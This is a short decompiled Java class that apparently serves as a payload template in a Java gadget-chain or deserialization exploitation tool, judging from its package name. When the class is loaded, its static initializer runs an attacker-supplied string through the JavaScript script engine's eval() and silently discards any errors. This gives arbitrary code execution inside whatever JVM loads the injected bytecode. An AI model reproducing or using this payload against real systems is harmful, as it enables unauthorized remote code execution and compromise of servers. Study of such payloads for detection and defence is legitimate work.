//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ar3h.plugin.fr.gadget.impl.bytecode.common.template;

import javax.script.ScriptEngineManager;

public class JsCodeExecBytecode {
    public static String code;

    public JsCodeExecBytecode() {
        try {
            new ScriptEngineManager().getEngineByName("js").eval(code);
        } catch (Exception e) {
        }
    }

    static {
        new JsCodeExecBytecode();
    }
}
